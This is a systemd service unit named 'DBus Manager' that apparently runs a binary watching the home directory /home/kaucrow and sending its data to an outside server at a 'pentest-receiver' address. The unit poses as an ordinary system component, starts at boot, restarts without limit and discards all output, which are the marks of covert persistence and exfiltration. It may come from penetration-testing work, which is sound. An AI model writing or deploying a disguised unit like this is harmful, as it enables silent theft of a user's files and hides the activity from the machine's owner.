[Unit]
Description=DBus Manager
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart=/usr/bin/dbus-manager --watch-path /home/kaucrow --server-url https://pentest-receiver-production.up.railway.app/watchdog/data
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

NoNewPrivileges=yes
PrivateTmp=yes

[Install]
WantedBy=multi-user.target